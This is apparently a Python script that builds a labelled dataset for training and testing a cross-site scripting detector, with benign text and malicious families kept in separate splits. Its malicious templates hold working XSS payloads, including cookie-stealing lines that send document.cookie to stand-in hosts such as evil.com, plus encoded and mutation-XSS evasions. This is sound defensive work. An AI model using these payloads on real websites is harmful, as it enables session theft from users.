"""
build_dataset_v2.py  (Day 4)

Builds an expanded, genuinely diverse dataset (1,000+ UNIQUE rows) with
fixed splits, so the final evaluation is honest.

Why a v2?  The original build_dataset.py produced 1,100 rows, but from only
34 base strings with a counter appended (e.g. "... (Ref: 72)"). Those rows
are near-duplicates, so any train/test split of them leaks. Here every row
is generated from templates with random fills, and uniqueness is enforced.

Splits (column `split`):
  train  60% of in-distribution rows. Only BENIGN train rows are used to
         fit the anomaly model (no attack example is ever used for training).
  val    20%  used to choose the anomaly contamination setting.
  test   20%  untouched until the final report.
  stress held-out on purpose: benign categories and attack families that
         never appear in train/val (hard benign HTML/code/math text, and
         evasion-style attacks: rare handlers, case/whitespace tricks,
         mutation XSS, data: URIs). Reported separately.

Output: data/xss_dataset_v2.csv  (text,label,category,family,split)
Run:    python src/build_dataset_v2.py
"""

import random
from pathlib import Path

import pandas as pd

SEED = 42
rnd = random.Random(SEED)

# ---------------------------------------------------------------------------
# Building blocks
# ---------------------------------------------------------------------------
FIRST = ["Rahul", "Priya", "Amit", "Sneha", "John", "Maria", "Chen", "Fatima", "Omar", "Anita",
         "David", "Emma", "Kabir", "Neha", "Liam", "Sofia", "Arjun", "Meera", "Noah", "Zara"]
LAST = ["Kumar", "Sharma", "Singh", "Patel", "Smith", "Garcia", "Wang", "Khan", "Ali", "Verma",
        "Brown", "Wilson", "Gupta", "Rao", "Taylor", "Lopez", "Mehta", "Joshi", "Clark", "Reddy"]
CITIES = ["Delhi", "Mumbai", "Ghaziabad", "Noida", "Pune", "London", "Berlin", "Toronto", "Sydney", "Austin"]
STREETS = ["Main Street", "MG Road", "Park Avenue", "Station Road", "Lake View", "Hill Crest", "Mall Road"]
PRODUCTS = ["laptop", "headphones", "water bottle", "backpack", "desk lamp", "keyboard", "monitor",
            "running shoes", "coffee maker", "phone case", "notebook", "office chair"]
ADJ = ["great", "excellent", "decent", "average", "amazing", "useful", "reliable", "solid", "disappointing"]
TOPICS = ["machine learning", "web security", "cooking", "football", "travel", "databases", "photography",
          "gardening", "cricket", "python", "networking", "music"]
DOMAINS = ["evil.com", "attacker.net", "x.example", "bad.site", "steal.io", "c2.example.org", "h4ck.me"]
ALERTS = ["alert(1)", "alert('XSS')", "alert(document.domain)", "confirm(1)", "prompt(1)", "alert(document.cookie)",
          "alert(String.fromCharCode(88,83,83))", "console.log(1)", "alert(origin)"]


def pick(xs):
    return rnd.choice(xs)


def num(lo=1, hi=99999):
    return rnd.randint(lo, hi)


# ---------------------------------------------------------------------------
# BENIGN categories.  (name, template functions)
# ---------------------------------------------------------------------------
def b_comment():
    return pick([
        f"Great article about {pick(TOPICS)}, thanks for sharing!",
        f"I {pick(['really', 'quite', 'honestly'])} liked this post on {pick(TOPICS)}.",
        f"This was {pick(ADJ)}. Looking forward to more on {pick(TOPICS)}.",
        f"Nice work {pick(FIRST)}! The part about {pick(TOPICS)} helped me a lot.",
        f"Can you write a follow-up on {pick(TOPICS)}? Thanks.",
    ])


def b_name():
    return pick([f"{pick(FIRST)} {pick(LAST)}", f"{pick(FIRST)} {pick(LAST)}-{pick(LAST)}",
                 f"{pick(FIRST)}_{pick(LAST)}{num(1, 99)}", f"Dr. {pick(FIRST)} {pick(LAST)}"])


def b_address():
    return pick([f"{num(1, 999)} {pick(STREETS)}, {pick(CITIES)}",
                 f"Flat {num(1, 40)}{pick('ABCD')}, {pick(STREETS)}, {pick(CITIES)} {num(100000, 999999)}",
                 f"House no. {num(1, 500)}, Sector {num(1, 60)}, {pick(CITIES)}"])


def b_search():
    return pick([f"{pick(ADJ)} {pick(PRODUCTS)} under {num(10, 500)} dollars",
                 f"best {pick(PRODUCTS)} {num(2020, 2026)}",
                 f"how to learn {pick(TOPICS)} fast",
                 f"{pick(PRODUCTS)} {pick(['review', 'price', 'comparison', 'deals'])}"])


def b_product():
    return pick([f"Product ID: {num(100000, 999999)}",
                 f"{pick(PRODUCTS).title()} - {pick(ADJ)} quality, ships in {num(1, 7)} days",
                 f"SKU-{num(1000, 9999)}-{pick('ABCDEF')}{pick('XYZ')}",
                 f"Category: {pick(['Electronics', 'Home', 'Sports', 'Books'])} & {pick(['Hardware', 'Garden', 'Outdoors'])}"])


def b_order():
    return pick([f"Order #{num(10000, 99999)} confirmed.",
                 f"Your order of {num(1, 5)} x {pick(PRODUCTS)} was shipped on {num(1, 28)}/{num(1, 12)}/2026.",
                 f"Refund of ${num(5, 300)}.{num(10, 99)} processed for order {num(10000, 99999)}."])


def b_feedback():
    return pick([f"Feedback: {pick(ADJ).capitalize()} service and quick delivery.",
                 f"Support was {pick(ADJ)}, resolved my issue in {num(1, 30)} minutes.",
                 f"Rating {num(1, 5)}/5 - {pick(ADJ)} experience overall."])


def b_email():
    u = f"{pick(FIRST).lower()}.{pick(LAST).lower()}{num(1, 99)}"
    return pick([f"{u}@{pick(['gmail.com', 'outlook.com', 'company.in', 'college.edu'])}",
                 f"Please contact {u}@company.com for help.",
                 f"Reply to {u}@mail.example by Friday."])


def b_price_date():
    return pick([f"Price range: ${num(10, 200)} - ${num(201, 900)}",
                 f"Meeting at {num(1, 12)}{pick(['am', 'pm'])} on {num(1, 28)} {pick(['Jan', 'Mar', 'Jun', 'Oct'])}",
                 f"Age: {num(18, 70)}, Location: {pick(CITIES)}"])


BENIGN_TRAIN_CATS = {
    "comment": b_comment, "name": b_name, "address": b_address, "search": b_search,
    "product": b_product, "order": b_order, "feedback": b_feedback, "email": b_email,
    "price_date": b_price_date,
}


# Stress-only benign: unseen categories, deliberately "weird but harmless"
def s_html_formatting():
    return pick([f"<b>{pick(ADJ).capitalize()}</b> post, thanks {pick(FIRST)}!",
                 f"<p>Hi team, the {pick(PRODUCTS)} arrived.</p>",
                 f"<a href=\"https://example.com/{pick(TOPICS).replace(' ', '-')}\">read more</a>",
                 f"<i>{pick(FIRST)}</i> said the {pick(PRODUCTS)} is {pick(ADJ)}.",
                 f"<ul><li>{pick(PRODUCTS)}</li><li>{pick(PRODUCTS)}</li></ul>"])


def s_code_talk():
    return pick([f"I used the script tag in my page and the {pick(TOPICS)} demo worked.",
                 f"In JavaScript, an alert box shows a message; I never use alert in production.",
                 f"Why does fetch return a promise? Asking about {pick(TOPICS)} code.",
                 f"My function onLoad handler is slow when loading {num(100, 900)} rows.",
                 f"Tip: avoid eval in your code, use JSON.parse for {pick(TOPICS)} data."])


def s_math():
    return pick([f"if x < {num(1, 9)} and y > {num(1, 9)} then z = x + y",
                 f"Solve: {num(2, 9)}x + {num(1, 20)} = {num(20, 99)}",
                 f"{num(1, 9)} < {num(10, 20)} && {num(30, 40)} > {num(1, 9)}",
                 f"f(x) = x^2 + {num(1, 9)}x - {num(1, 9)}; f({num(1, 5)}) = ?"])


def s_url_path():
    return pick([f"https://www.example.com/{pick(TOPICS).replace(' ', '-')}?page={num(1, 20)}&sort=asc",
                 f"C:\\Users\\{pick(FIRST)}\\Documents\\{pick(PRODUCTS).replace(' ', '_')}.txt",
                 f"/var/www/{pick(TOPICS).replace(' ', '_')}/index.html",
                 f"page={num(1, 9)}&sort=desc&q={pick(PRODUCTS).replace(' ', '+')}"])


def s_structured():
    return pick([f"{{'status': 'success', 'id': {num(1, 9999)}}}",
                 f"SELECT name FROM users WHERE id = {num(1, 999)};",
                 f"key=value; theme=dark; lang=en-IN",
                 f"\"{pick(FIRST)} said: 'it's {pick(ADJ)}!'\""])


def s_long_paragraph():
    return " ".join(b_comment() for _ in range(rnd.randint(3, 5)))


BENIGN_STRESS_CATS = {
    "html_formatting": s_html_formatting, "code_talk": s_code_talk, "math": s_math,
    "url_path": s_url_path, "structured": s_structured, "long_paragraph": s_long_paragraph,
}

# ---------------------------------------------------------------------------
# MALICIOUS families.
# ---------------------------------------------------------------------------
TAGS_WITH_HANDLER = ["img src=x", "svg", "body", "input autofocus", "video src=x", "audio src=x", "details open"]
COMMON_HANDLERS = ["onerror", "onload", "onfocus", "onmouseover", "ontoggle", "onstart"]
RARE_HANDLERS = ["onclick", "onmouseenter", "onpageshow", "onanimationstart", "onpointerdown", "onwheel",
                 "onfocusin", "oncopy", "onbegin", "ontransitionend", "onauxclick", "ondblclick"]
EXFIL = ["fetch('http://{d}/?c='+document.cookie)", "new Image().src='http://{d}/?c='+document.cookie",
         "document.location='http://{d}/?c='+document.cookie", "eval(atob('YWxlcnQoMSk='))"]


def m_script_tag():
    return pick([f"<script>{pick(ALERTS)}</script>",
                 f"<script src=http://{pick(DOMAINS)}/x.js></script>",
                 f"<script>{pick(EXFIL).format(d=pick(DOMAINS))}</script>",
                 f"<SCRIPT>{pick(ALERTS)}</SCRIPT>", f"<script >{pick(ALERTS)}</script >",
                 f"<script type=\"text/javascript\">{pick(ALERTS)}</script>"])


def m_event_common():
    t = pick(TAGS_WITH_HANDLER)
    return pick([f"<{t} {pick(COMMON_HANDLERS)}={pick(ALERTS)}>",
                 f"<{t} {pick(COMMON_HANDLERS)}=\"{pick(ALERTS)}\">",
                 f"<svg/{pick(COMMON_HANDLERS)}={pick(ALERTS)}>"])


def m_js_uri():
    return pick([f"<a href=\"javascript:{pick(ALERTS)}\">click</a>",
                 f"<iframe src=\"javascript:{pick(ALERTS)}\"></iframe>",
                 f"<form action=\"javascript:{pick(ALERTS)}\"><input type=submit>",
                 f"javascript:{pick(ALERTS)}"])


def m_frame_object():
    return pick([f"<iframe src=http://{pick(DOMAINS)}/p.html></iframe>",
                 f"<object data=\"http://{pick(DOMAINS)}/x.swf\"></object>",
                 f"<embed src=\"http://{pick(DOMAINS)}/x.svg\">",
                 f"<iframe srcdoc=\"<script>{pick(ALERTS)}</script>\"></iframe>"])


def m_encoded():
    s = pick(ALERTS)
    return pick([f"%3Cscript%3E{s}%3C/script%3E",
                 "&#60;script&#62;" + "".join(f"&#{ord(c)};" for c in s[:8]),
                 f"&#x3C;img src=x onerror={s}&#x3E;",
                 f"%3cscript%3e{s}%3c%2fscript%3e"])


def m_js_context():
    """No tag at all: breaking out of a JS string/attribute context. The rule
    engine has no pattern for most of these -> the anomaly detector's job."""
    s = pick(ALERTS)
    return pick([f"';{s}//", f"\";{s}//", f"');{s};//", f"\"-{s}-\"", f"'-{s}-'",
                 f"\\';{s}//", f"1;{s}", f"`${{{s}}}`", f"');{s}</script>"])


def m_exfil_dom():
    d = pick(DOMAINS)
    return pick([f"<img src=x onerror=\"{pick(EXFIL).format(d=d)}\">",
                 f"<body onload=\"{pick(EXFIL).format(d=d)}\">",
                 f"<a href=\"javascript:{pick(EXFIL).format(d=d)}\">Claim Prize</a>",
                 f"<script>document.write('<img src=http://{d}/?c='+document.cookie+'>')</script>"])


def m_mixed_obfuscated():
    return pick([f"<scr<script>ipt>{pick(ALERTS)}</scr</script>ipt>",
                 f"<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
                 f"<svg><script>{pick(ALERTS)}</script></svg>",
                 f"<body onload={pick(ALERTS)}><!-- {num()} -->"])


MAL_TRAIN_FAMS = {
    "script_tag": m_script_tag, "event_common": m_event_common, "js_uri": m_js_uri,
    "frame_object": m_frame_object, "encoded": m_encoded, "js_context": m_js_context,
    "exfil_dom": m_exfil_dom, "mixed_obfuscated": m_mixed_obfuscated,
}


# Stress-only attack families: evasion styles the rule engine was NOT written for
def x_rare_handler():
    t = pick(["div", "button", "a href=#", "p", "span", "select", "textarea"])
    return f"<{t} {pick(RARE_HANDLERS)}={pick(ALERTS)}>{pick(['click', 'hover', 'x'])}"


def x_case_ws():
    s = pick(ALERTS)
    return pick([f"<ScRiPt>{s}</sCrIpT>", f"<img\nsrc=x\nOnErRoR={s}>", f"<svg\tonload\t=\t{s}>",
                 f"<IMG SRC=x ONERROR={s.upper()}>", f"JaVaScRiPt:{s}"])


def x_data_uri():
    return pick([f"<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">x</a>",
                 f"<iframe src=\"data:text/html,<b>{num()}</b>\"></iframe>",
                 f"<embed src=\"data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+\">"])


def x_mutation():
    s = pick(ALERTS)
    return pick([f"<math><mtext><table><mglyph><style><!--</style><img title=\"--&gt;&lt;img src=1 onerror={s}&gt;\">",
                 f"<noscript><p title=\"</noscript><img src=x onerror={s}>\">",
                 f"<svg><animate onbegin={s} attributeName=x dur=1s>",
                 f"<meta http-equiv=\"refresh\" content=\"0;url=data:text/html,<script>{s}</script>\">"])


def x_js_context_long():
    s = pick(ALERTS)
    return pick([f"x=document.cookie;{s};//{num()}", f"';var a=new XMLHttpRequest();a.open('GET','http://{pick(DOMAINS)}/'+document.domain);//",
                 f"</script><svg/onload={s}>", f"\"onmouseover=\"{s}\" x=\""])


MAL_STRESS_FAMS = {
    "rare_handler": x_rare_handler, "case_whitespace": x_case_ws, "data_uri": x_data_uri,
    "mutation_xss": x_mutation, "js_context_long": x_js_context_long,
}


# ---------------------------------------------------------------------------
# Generation
# ---------------------------------------------------------------------------
def gen_unique(fn, n, seen, max_tries=20000):
    out, tries = [], 0
    while len(out) < n and tries < max_tries:
        tries += 1
        t = fn()
        if t not in seen:
            seen.add(t)
            out.append(t)
    return out


def assign_splits(n):
    idx = list(range(n))
    rnd.shuffle(idx)
    cut1, cut2 = int(n * 0.6), int(n * 0.8)
    split = ["train"] * n
    for k, i in enumerate(idx):
        split[i] = "train" if k < cut1 else ("val" if k < cut2 else "test")
    return split


def build():
    rows, seen = [], set()
    for cat, fn in BENIGN_TRAIN_CATS.items():
        texts = gen_unique(fn, 110, seen)
        for t, sp in zip(texts, assign_splits(len(texts))):
            rows.append((t, 0, cat, "benign", sp))
    for cat, fn in BENIGN_STRESS_CATS.items():
        for t in gen_unique(fn, 30, seen):
            rows.append((t, 0, cat, "benign_stress", "stress"))
    for fam, fn in MAL_TRAIN_FAMS.items():
        texts = gen_unique(fn, 80, seen)
        for t, sp in zip(texts, assign_splits(len(texts))):
            rows.append((t, 1, fam, fam, sp))
    for fam, fn in MAL_STRESS_FAMS.items():
        for t in gen_unique(fn, 30, seen):
            rows.append((t, 1, fam, fam, "stress"))

    df = pd.DataFrame(rows, columns=["text", "label", "category", "family", "split"])
    df = df.sample(frac=1, random_state=SEED).reset_index(drop=True)
    return df


if __name__ == "__main__":
    df = build()
    out = Path(__file__).resolve().parent.parent / "data" / "xss_dataset_v2.csv"
    out.parent.mkdir(exist_ok=True)
    df.to_csv(out, index=False)
    print(f"Wrote {len(df)} rows ({df.text.nunique()} unique) to {out}")
    print(df.groupby(["split", "label"]).size().unstack(fill_value=0))
